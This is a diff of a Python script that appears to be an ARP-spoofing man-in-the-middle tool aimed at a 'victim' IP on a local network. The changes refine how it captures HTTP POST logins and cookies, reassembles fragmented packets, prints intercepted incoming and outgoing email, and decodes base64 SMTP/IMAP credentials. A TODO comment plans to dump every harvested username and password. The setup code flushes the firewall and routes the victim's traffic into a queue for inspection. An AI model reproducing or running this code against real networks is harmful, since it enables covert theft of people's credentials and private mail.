@@ -1,5 +1,12 @@
 #!/usr/bin/python
 
+'''
+ADD A DICTIONARY OF LOGINS AND PASSWORDS AND ON CTRL-C HAVE IT THROW ALL THE USERNAMES, PASSWORDS, AND SERVER TO OUTPUT
+MAKE DNSSPOOF RELIABLE
+ADD wifi-monitor TO IT IF NO -ip OPTION EXISTS
+MAKE MAILSPY NOT DOUBLE OUTPUT
+'''
+
 #from logging import getLogger
 import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
@@ -68,7 +75,8 @@ class Spoof():
 
 class Parser():
 
-	headersFound = []
+	OheadersFound = []
+	IheadersFound = []
 	IMAPauth = 0
 	IMAPdest = ''
 	POPauth = 0
@@ -77,6 +85,7 @@ class Parser():
 	IRCnick = ''
 	oldack = ''
 	oldpkt = ''
+	fragged = 0
 
 	def start(self, payload):
 		try:
@@ -84,6 +93,22 @@ class Parser():
 			pkt = Ether(data)/IP(data)
 		except:
 			return
+##ADDED FOR TSTING
+#		if pkt.haslayer(Raw) and pkt.haslayer(Ether) and pkt.haslayer(TCP) and pkt[TCP].dport == 80 and pkt[IP].src == victimIP:
+#			load = repr(pkt[Raw].load)[1:-1]
+#			ack = pkt[TCP].ack
+#			if 'POST ' in load:
+#				if ack == self.oldack:
+#					self.oldpkt = self.oldpkt+load
+#					load = self.oldpkt
+#					self.fragged = 1
+#				else:
+#					self.oldpkt = load
+#					self.oldack = ack
+#					self.fragged = 0
+#				print load+'\n'
+#		return
+################
 		if pkt.haslayer(Raw) and pkt.haslayer(Ether) and pkt.haslayer(TCP):
 			dport = pkt[TCP].dport
 			sport = pkt[TCP].sport
@@ -96,15 +121,17 @@ class Parser():
 			IP_src = pkt[IP].src
 			# Can't use repr if we're gzip deflating which will be necessary when code injection is added
 			load = repr(pkt[Raw].load)[1:-1]
+			mail_ports = [25, 26, 110, 143]
 			# Catch fragmented packets only if they're being sent from the victim to a web server
-			if dport == 80:
+			if dport == 80 or sport in mail_ports or dport in mail_ports:
 				if ack == self.oldack:
 					self.oldpkt = self.oldpkt+load
 					load = self.oldpkt
+					self.fragged = 1
 				else:
 					self.oldpkt = load
 					self.oldack = ack
-			mail_ports = [25, 26, 110, 143]
+					self.fragged = 0
 			if dport in mail_ports or sport in mail_ports:
 				self.mailspy(load, dport, sport, MAC_dst, IP_dst, IP_src)
 			if dport == 6667 or sport == 6667:
@@ -184,20 +211,16 @@ class Parser():
 				if 'ocsp' in url:
 					print B+'[+] POST: '+W+url
 				elif body != '':
-					print B+'[+] POST: '+W+url+B+' HTTP POST load:',body+W
+					urlsplit = url.split('/')
+					url = url[0]+'/'+url[1]
+					if self.fragged == 1:
+						print B+'[+] POST: '+W+url+B+" Fragmented HTTP POST's combined load: "+body+W
+					else:
+						print B+'[+] POST: '+W+url+B+' HTTP POST load: '+body+W
 					username = re.findall(user_regex, body)
 					password = re.findall(pw_regex, body)
 					self.user_pass(username, password)
 					self.cookies(host, header_lines)
-
-#		oldack = ack
-#		oldurl = url
-#		oldhost = host
-#		if oldack != ack:
-#			oldhttp = None
-#			combined_load = None
-#		else:
-#			oldload = load
 
 	host = None
 	get = None
@@ -319,9 +342,8 @@ class Parser():
 		if dport == 26 or dport == 25:
 			self.outgoing(load, body, header_lines, email_headers, IP_src)
 #		Find incoming messages
-#		if IP_dst == victimIP:
 		if sport in [110, 143]:
-			self.incoming(headers, body, header_lines, email_headers)
+			self.incoming(headers, body, header_lines, email_headers, sport, dport)
 
 	def passwords(self, IP_src, load, dport, IP_dst):
 		# Get rid of all the hex at the beginning of the load
@@ -357,105 +379,138 @@ class Parser():
 
 	# This doubles up the outgoing message for some reason. Fix.
 	def outgoing(self, headers, body, header_lines, email_headers, IP_src):
-		if IP_src == victimIP:
-			if 'Message-ID' in headers:
-				for l in header_lines:
-					for x in email_headers:
-						if x in l:
-							self.headersFound.append(l)
-				if len(self.headersFound) > 3:
-					print O+'[!] OUTGOING MESSAGE'+W
+#		if IP_src == victimIP:
+		if 'Message-ID' in headers:
+			for l in header_lines:
+				for x in email_headers:
+					if x in l:
+						self.OheadersFound.append(l)
+			if len(self.OheadersFound) > 3 and body != '':
+				print O+'[!] OUTGOING MESSAGE'+W
+				if args.write:
+					logger.write('[!] OUTGOING MESSAGE\n')
+				for x in self.OheadersFound:
+					print O+'	',x+W
 					if args.write:
-						logger.write('[!] OUTGOING MESSAGE\n')
-					for x in self.headersFound:
-						print O+'	',x+W
-						if args.write:
-							logger.write('	'+x+'\n')
-					self.headersFound = []
-					if body != '':
-						try:
-							body = body.split(r'\r\n\x')[0]
-						except:
-							pass
-						print O+'	Message:',body+W
-						if args.write:
-							logger.write('	Message:'+body+'\n')
+						logger.write('	'+x+'\n')
+				try:
+					body = body.split(r'\r\n\x')[0]
+					print O+'	Message:',body+W
+				except:
+					print O+'	[!] Could not parse message body'+W
+					pass
+				if args.write:
+					logger.write('	Message:'+body+'\n')
+		self.OheadersFound = []
 
-	def incoming(self, headers, body, header_lines, email_headers):
+	def incoming(self, headers, body, header_lines, email_headers, sport, dport):
+		message = ''
 		for l in header_lines:
 			for x in email_headers:
 				if x in l:
-					self.headersFound.append(l)
-		if body != '':
-			try:
-				beginning = body.split(r"\r\n")[0]
-				message = str(body.split(r"\r\n\r\n", 1)[1:]).replace('[', '', 1)
-				message = message.split(beginning)[0][1:]
-			except:
-				print O+'	Couldn\'t format message body:', body+W
-		if len(self.headersFound) > 3 and message != '':
-			print O+'[!] INCOMING MESSAGE'+W
-			if args.write:
-				logger.write('[!] INCOMING MESSAGE\n')
-			for x in self.headersFound:
-				print O+'	'+x+W
+					self.IheadersFound.append(l)
+		if len(self.IheadersFound) > 3 and body != '':
+			if "BODY[TEXT]" not in body:
+				try:
+					beginning = body.split(r"\r\n", 1)[0]
+					body1 = body.split(r"\r\n\r\n", 1)[1]
+					message = body1.split(beginning)[0][:-8] #get rid of last \r\n\r\n
+				except:
+					return
+			if message != '':
+				print O+'[!] INCOMING MESSAGE'+W
 				if args.write:
-					logger.write('	'+x+'\n')
-			print O+'	Message:', message+W
-			if args.write:
-				logger.write('	Message:'+message+'\n')
-		self.headersFound = []
+					logger.write('[!] INCOMING MESSAGE\n')
+				for x in self.IheadersFound:
+					print O+'	'+x+W
+					if args.write:
+						logger.write('	'+x+'\n')
+				print O+'	Message: '+message+W
+				if args.write:
+					logger.write('	Message: '+message+'\n')
+		self.IheadersFound = []
 
 	def decode(self, load, dport):
-		if dport == 26 or dport == 25:
-			try:
-				b64str = load.replace("AUTH PLAIN ", "").replace(r"\r\n", "")
-				decoded = repr(b64decode(b64str))[1:-1].replace(r'\x00', ' ')
-				# Sometimes the hex at the beginning of the load goes 2 chars past the last \x and sometimes 3 or 4
+		decoded = ''
+		# This can probably be optimized better...
+		for i in xrange(0,5):
+			if dport == 25 or dport == 26:
+				# Sometimes the hex at the beginning of the load goes more than 2 chars past the last \x
+				try:
+					b64str = load.replace("AUTH PLAIN ", "").replace(r"\r\n", "")[i:]
+					decoded = repr(b64decode(b64str))[1:-1].replace(r'\x00', ' ')
+					# Sometimes the hex at the beginning of the load goes 2 chars past the last \x and sometimes 3 or 4
+				except:
+					pass
 				if '@' in decoded:
 					print R+'[!] Decoded:'+decoded+W
 					if args.write:
 						logger.write('[!] Decoded:'+decoded+'\n')
+					break
 				else:
-					b64str = load.replace("AUTH PLAIN ", "").replace(r"\r\n", "")[1:]
+					continue
+			else:
+				try:
+					b64str = load[i:]
 					decoded = repr(b64decode(b64str))[1:-1].replace(r'\x00', ' ')
-					if '@' in decoded:
-						print R+'[!] Decoded:'+decoded+W
-						if args.write:
-							logger.write('[!] Decoded:'+decoded+'\n')
-					else:
-						b64str = load.replace("AUTH PLAIN ", "").replace(r"\r\n", "")[2:]
-						decoded = repr(b64decode(b64str)).replace("'", "").replace(r'\x00', ' ')
-						if '@' in decoded:
-							print R+'[!] Decoded:'+decoded+W
-							if args.write:
-								logger.write('[!] Decoded:'+decoded+'\n')
-			except:
-				pass
-		else:
-			try:
-				b64str = load
-				decoded = repr(b64decode(b64str))[1:-1].replace(r'\x00', ' ')
+				except:
+					pass
 				if '@' in decoded:
-					print R+'[!] Decoded:',decoded+W
+					print R+'[!] Decoded:'+decoded+W
 					if args.write:
 						logger.write('[!] Decoded:'+decoded+'\n')
+					break
 				else:
-					b64str = load[1:]
-					decoded = repr(b64decode(b64str))[1:-1].replace(r'\x00', ' ')
-					if '@' in decoded:
-						print R+'[!] Decoded:',decoded+W
-						if args.write:
-							logger.write('[!] Decoded:'+decoded+'\n')
-					else:
-						b64str = load[2:]
-						decoded = repr(b64decode(b64str))[1:-1].replace(r'\x00', ' ')
-						if '@' in decoded:
-							print R+'[!] Decoded:',decoded+W
-							if args.write:
-								logger.write('[!] Decoded:'+decoded+'\n')
-			except:
-				pass
+					continue
+#		if dport == 26 or dport == 25:
+#			try:
+#				b64str = load.replace("AUTH PLAIN ", "").replace(r"\r\n", "")
+#				decoded = repr(b64decode(b64str))[1:-1].replace(r'\x00', ' ')
+#				# Sometimes the hex at the beginning of the load goes 2 chars past the last \x and sometimes 3 or 4
+#				if '@' in decoded:
+#					print R+'[!] Decoded:'+decoded+W
+#					if args.write:
+#						logger.write('[!] Decoded:'+decoded+'\n')
+#				else:
+#					b64str = load.replace("AUTH PLAIN ", "").replace(r"\r\n", "")[1:]
+#					decoded = repr(b64decode(b64str))[1:-1].replace(r'\x00', ' ')
+#					if '@' in decoded:
+#						print R+'[!] Decoded:'+decoded+W
+#						if args.write:
+#							logger.write('[!] Decoded:'+decoded+'\n')
+#					else:
+#						b64str = load.replace("AUTH PLAIN ", "").replace(r"\r\n", "")[2:]
+#						decoded = repr(b64decode(b64str)).replace("'", "").replace(r'\x00', ' ')
+#						if '@' in decoded:
+#							print R+'[!] Decoded:'+decoded+W
+#							if args.write:
+#								logger.write('[!] Decoded:'+decoded+'\n')
+#			except:
+#				pass
+#		else:
+#			try:
+#				b64str = load
+#				decoded = repr(b64decode(b64str))[1:-1].replace(r'\x00', ' ')
+#				if '@' in decoded:
+#					print R+'[!] Decoded:',decoded+W
+#					if args.write:
+#						logger.write('[!] Decoded:'+decoded+'\n')
+#				else:
+#					b64str = load[1:]
+#					decoded = repr(b64decode(b64str))[1:-1].replace(r'\x00', ' ')
+#					if '@' in decoded:
+#						print R+'[!] Decoded:',decoded+W
+#						if args.write:
+#							logger.write('[!] Decoded:'+decoded+'\n')
+#					else:
+#						b64str = load[2:]
+#						decoded = repr(b64decode(b64str))[1:-1].replace(r'\x00', ' ')
+#						if '@' in decoded:
+#							print R+'[!] Decoded:',decoded+W
+#							if args.write:
+#								logger.write('[!] Decoded:'+decoded+'\n')
+#			except:
+#				pass
 
 #Wrap the nfqueue object in an IReadDescriptor and run the process_pending function in a .doRead() of the twisted IReadDescriptor
 class Queued(object):
@@ -466,7 +521,7 @@ class Queued(object):
 		self.q.set_queue_maxlen(5000)
 		reactor.addReader(self)
 		self.q.set_mode(nfqueue.NFQNL_COPY_PACKET)
-		print '[+] Queue started; waiting for data\n'
+		print '[*] Queue started; waiting for data\n'
 	def fileno(self):
 		return self.q.get_fd()
 	def doRead(self):
@@ -520,12 +575,12 @@ class Threads():
 
 #Print all the variables
 def print_vars(interface, DHCPsrvr, dnsIP, local_domain, routerIP, victimIP):
-	print "[+] Active interface: " + interface
-	print "[+] DHCP server: " + DHCPsrvr
-	print "[+] DNS server: " + dnsIP
-	print "[+] Local domain: " + local_domain
-	print "[+] Router IP: " + routerIP
-	print "[+] Client IP: " + victimIP
+	print "[*] Active interface: " + interface
+	print "[*] DHCP server: " + DHCPsrvr
+	print "[*] DNS server: " + dnsIP
+	print "[*] Local domain: " + local_domain
+	print "[*] Router IP: " + routerIP
+	print "[*] Client IP: " + victimIP
 
 #Enable IP forwarding and flush possibly conflicting iptables rules
 def setup(DN, victimMAC):
@@ -534,12 +589,12 @@ def setup(DN, victimMAC):
 		ipf = open('/proc/sys/net/ipv4/ip_forward', 'r+')
 		ipf.write('1\n')
 		ipf.close()
-		print '[+] Enabled IP forwarding'
+		print '[*] Enabled IP forwarding'
 	os.system('iptables -F')
 	os.system('iptables -X')
 	os.system('iptables -t nat -F')
 	os.system('iptables -t nat -X')
-	print '[+] Flushed the firewall'
+	print '[*] Flushed the firewall'
 	# PREROUTING is a rule that will be needed to be added when code injection is added to this script
 #	os.system('iptables -t nat -A PREROUTING -p tcp -s %s -j NFQUEUE' % victimIP)
 #	os.system('iptables -t nat -A PREROUTING -p tcp -d %s -j NFQUEUE' % victimIP)
@@ -548,7 +603,7 @@ def setup(DN, victimMAC):
 	os.system('iptables -A FORWARD -p tcp -d %s -m multiport --dports 21,26,53,80,110,143,6667 -j NFQUEUE' % victimIP)
 	os.system('iptables -A FORWARD -p tcp -s %s -m multiport --sports 21,26,53,80,110,143,6667 -j NFQUEUE' % victimIP)
 	os.system('iptables -A FORWARD -p tcp -d %s -m multiport --sports 21,26,53,80,110,143,6667 -j NFQUEUE' % victimIP)
-	print '[+] Forwarded traffic to the queue'
+	print '[*] Forwarded traffic to the queue'
 
 def main():
 	#For use in URL_cb, mailspy respectively
@@ -604,7 +659,7 @@ def main():
 	else:
 		interface = routerRE.group(3)
 
-	print "[+] Checking the DHCP and DNS server addresses..."
+	print "[*] Checking the DHCP and DNS server addresses..."
 	# DHCP is a pain in the ass to craft
 	dhcp = (Ether(dst='ff:ff:ff:ff:ff:ff')/
 			IP(src="0.0.0.0",dst="255.255.255.255")/
@@ -640,18 +695,18 @@ def main():
 	print_vars(interface, DHCPsrvr, dnsIP, local_domain, routerIP, victimIP)
 	try:
 		routerMAC = Spoof().originalMAC(routerIP)
-		print "[+] Router MAC: " + routerMAC
+		print "[*] Router MAC: " + routerMAC
 	except:
 		exit("[!] Could not get router MAC address")
 	try:
 		victimMAC = Spoof().originalMAC(victimIP)
-		print "[+] Victim MAC: " + victimMAC
+		print "[*] Victim MAC: " + victimMAC
 	except:
 		exit("[!] Could not get victim MAC address")
 	if dnsIP != routerIP:
 		try:
 			dnsMAC = Spoof().originalMAC(dnsIP)
-			print "[+] DNS server MAC: " + dnsMAC
+			print "[*] DNS server MAC: " + dnsMAC
 		except:
 			print "[!] Could not get DNS server MAC address"
 	if dnsIP == routerIP:
